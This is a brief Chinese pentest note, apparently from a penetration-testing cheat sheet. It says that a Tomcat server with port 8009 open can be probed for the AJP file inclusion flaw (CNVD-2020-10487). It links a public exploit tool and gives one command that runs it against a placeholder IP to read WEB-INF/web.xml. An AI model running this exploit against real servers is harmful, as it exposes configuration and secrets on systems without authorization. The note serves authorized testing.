当发现目标为tomcat应用服务器，且开启8009或类似的端口，可尝试tomcat ajp文件包含漏洞

借助工具：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/

执行命令
```
python2 ./tool/CNVD-2020-10487-Tomcat-Ajp-lfi.py xx.xx.xx.xx -p 8443 -f WEB-INF/web.xml
```
借用网图  
![image](./pic/1.png)  
